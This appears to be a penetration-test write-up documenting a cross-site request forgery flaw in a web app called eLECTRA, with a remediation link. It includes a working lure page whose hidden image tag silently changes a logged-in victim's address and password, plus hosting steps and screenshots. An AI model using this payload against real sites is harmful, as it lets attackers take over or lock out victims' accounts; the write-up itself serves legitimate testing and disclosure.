# Task 18: CSRF: The Free Extra Finding

**Vulnerability:** Cross-Site Request Forgery (CWE-352)

**Endpoint:** `GET /home/profile/update`

From recon we confirmed that `/home/profile/update` submits over GET with no CSRF
token. Any page that includes a request to that URL will fire it silently using the
victim's active session cookie. CSRF verification is also disabled site-wide in
`app/Http/Middleware/VerifyCsrfToken.php`.

---

## Steps

Create a payload page hosted on Kali that fires the profile update request the
moment it loads:

```html
<html>
<body>
<h1>You have a free electricity credit!</h1>
<img src="http://192.168.77.80/home/profile/update?id=3&address=Owned%20via%20CSRF&password=csrf123">
</body>
</html>
```

Host it with Python:

```bash
python3 -m http.server 8888
```

With an authenticated session active in the browser, navigate to
`http://127.0.0.1:8888/csrf.html`. The `<img>` tag fires the GET request
automatically using the victim's session cookie -- no interaction with eLECTRA
required.

**Note:** Firefox blocks cross-site cookies by default. This was disabled for the test to demonstrate the vulnerability.

## Evidence

The payload page as the victim sees it:

<img width="645" height="198" alt="image" src="https://github.com/user-attachments/assets/3d7ac434-4346-467a-8c88-b1e0fa273257" />

My Account showing the address changed to "Owned via CSRF" with no interaction in eLECTRA:

<img width="816" height="495" alt="image" src="https://github.com/user-attachments/assets/742f336a-6e30-4c4e-a404-a2d3548f5127" />

## What this reveals to an attacker

Any authenticated customer who visits a malicious page will have their account modified. Combined with the missing `HttpOnly` flag on `electra_session`,
an attacker could chain this with XSS to steal sessions or use CSRF alone to
change passwords and lock victims out of their accounts.

## Remediation

See [remediation](../remediation.md)
